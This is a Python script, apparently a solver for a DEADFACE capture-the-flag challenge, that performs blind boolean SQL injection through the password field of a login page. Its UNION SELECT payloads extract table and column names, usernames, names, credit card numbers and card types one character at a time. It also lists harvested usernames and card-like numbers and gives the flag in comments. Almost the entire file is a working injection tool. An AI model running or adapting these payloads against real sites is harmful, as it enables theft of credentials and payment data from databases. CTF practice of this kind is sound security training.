import requests
import string
import multiprocessing
import base64

# 0ctf{3l3v4ting_y0ur_sql_1nj3ction_g4m3_t0_th3_n3xt_l3v3l} WRONG
# 0CTF{3l3v4ting_Y0ur_SQL_1nj3ction_G4m3_T0_Th3_N3xt_L3v3l} CORRECT
# in sqlite's LIKE 's perspective: y = Y a = A and so on i.e. it's is case insensitive

SUBSTR_IDX = 1
SUBSTR_IDX_2 = 1

known_cols = ["city", "country", "email", "street",
              "credit_card", "credit_type", "dob", "first_name", "last_name", "gender", "id", "password", "postal", "state", "username"]

known_users = ['admin', 'bmatuska8', 'cyurlov5', 'ddraysay9', 'etoy6',
               'kanthoine1', 'lschwandermann4', 'lwaddell0', 'mkivelle3', 'spepys2', 'yyurlov7']

known_first_names = ['admin', 'benjie',
                     'concettina', 'dawn', 'emmalee', 'kara']

known_last_names = ['admin', 'anthoine', 'draysay', 'kivelle',
                    'matuska', 'pepys', 'schwandermann', 'toy', 'waddell', 'yurlov']

known_credit_card = ['NTEwODc1ODI5MTv','5048372118334172','5048373064404738','5048373353911013','5048375602863747',
                     '5048376381363693','5048376962231442','5048377120668970',
                     '5048378931690658','5108757962496860','5108758291372194','5108758291372194','5108758659616083']

known_credit_card = []
known_credit_type = []
url = "https://trendytrove.deadface.io/login.php"


def trial(cha):
    credit_card_condition = " and ".join([f"credit_type <> '{x}'" for x in known_credit_type])
    
    password_query = (
        f"' union select credit_type"
        f"{(',1' * 14)} "
        f"from users where {credit_card_condition} "
        f"and substr(credit_type, {SUBSTR_IDX}, {SUBSTR_IDX_2}) = '{cha}' "
        f"order by id desc;-- -"
    )

    
    data = {
        'username': "x",
        # find table name
        #"password": f"' union select table_name{(',1' * 14)} from information_schema.tables where table_name LIKE '{cha}%' and table_type = 'BASE TABLE';-- -",
        #"password": f"' union select table_name{(',1' * 14)} from information_schema.tables where substr(table_name, {SUBSTR_IDX}, {SUBSTR_IDX_2}) = '{cha}' and table_type = 'BASE TABLE';-- -",

        # find columns
        # "password": f"' union select column_name{(',1' * 14)} from information_schema.columns where {" and ".join([f"column_name <> '{x}'" for x in known_cols])} and table_name='users' and substr(column_name, {SUBSTR_IDX}, {SUBSTR_IDX_2}) = '{cha}';-- -",

        # "password": f"' union select username{(',1' * 14)} from users where {" and ".join([f"username <> '{x}'" for x in known_users])} and substr(username, {SUBSTR_IDX}, {SUBSTR_IDX_2}) = '{cha}';-- -",

        # "password": f"' union select first_name{(',1' * 14)} from users where {" and ".join([f"first_name <> '{x}'" for x in known_first_names])} and substr(first_name, {SUBSTR_IDX}, {SUBSTR_IDX_2}) = '{cha}' order by id desc;-- -",

        # "password": f"' union select last_name{(',1' * 14)} from users where {" and ".join([f"last_name <> '{x}'" for x in known_last_names])} and substr(last_name, {SUBSTR_IDX}, {SUBSTR_IDX_2}) = '{cha}' order by id desc;-- -",

        #"password": f"' union select credit_card{(',1' * 14)} from users where {" and ".join([f"credit_card <> '{x}'" for x in known_credit_card])} and substr(credit_card, {SUBSTR_IDX}, {SUBSTR_IDX_2}) = '{cha}' order by id desc;-- -",
        "password": f"' union select credit_type{(',1' * 14)} from users where username='spepys2' and substr(BINARY TO_BASE64(credit_type), {SUBSTR_IDX}, {SUBSTR_IDX_2}) = '{cha}';-- -",
        #"password": password_query,
    }
    # print(data["password"])
    # known_users = ['admin', 'bmatuska8', 'cyurlov5', 'ddraysay9', 'etoy6',
    #            'kanthoine1', 'lschwandermann4', 'lwaddell0', 'mkivelle3', 'spepys2', 'yyurlov7']

    response = requests.post(url, data=data)
    # print(cha)
    if "invalid" not in response.text.lower():
        return True
    # print(response)
    return False


# charset = string.ascii_lowercase + string.digits + ",{}()_/= "
charset = string.ascii_letters + string.digits + ",{}()_= "

# while True:
#     op = ""
#     op_old = ""
#     SUBSTR_IDX_2 = 1

#     while True:
#         with multiprocessing.Pool(len(charset)) as p:
#             # print([op + x for x in charset])
#             results = p.map(trial, [op + x for x in charset])
#             # print(results)
#             for idx, result in enumerate(results):
#                 if result:
#                     op += charset[idx]
#                     print(op)
#                     break

#             if op.strip() == op_old.strip():
#                 break
#             op_old = op

#         SUBSTR_IDX_2 += 1
#         # break

#     # known_users.append(op.strip())
#     # print(known_users)

#     # known_first_names.append(op.strip())
#     # print(known_first_names)

#     known_last_names.append(op.strip())
#     print(known_last_names)

op = ""
op_old = ""
SUBSTR_IDX_2 = 1

while True:
    with multiprocessing.Pool(len(charset)) as p:
        # print([op + x for x in charset])
        results = p.map(trial, [op + x for x in charset])
        # print(results)
        for idx, result in enumerate(results):
            if result:
                op += charset[idx]
                print(op)
                break

        if op.strip() == op_old.strip():
            break
        op_old = op

    SUBSTR_IDX_2 += 1
    # break

print(base64.b64decode(op).decode())
